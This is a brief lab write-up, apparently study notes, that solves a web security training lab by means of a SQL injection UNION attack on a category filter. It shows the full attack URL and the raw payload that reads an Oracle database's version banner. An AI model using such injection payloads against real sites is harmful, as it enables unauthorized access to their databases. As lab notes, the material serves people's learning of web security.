
#### This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

```python
https://0abc00ef04bca1a68040080300d900f7.web-security-academy.net/filter?category= aquiel sql

https://0abc00ef04bca1a68040080300d900f7.web-security-academy.net/filter?category=%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--

#Sql
' UNION SELECT BANNER, NULL FROM v$version--

```


![[Pasted image 20260705122940.png]]

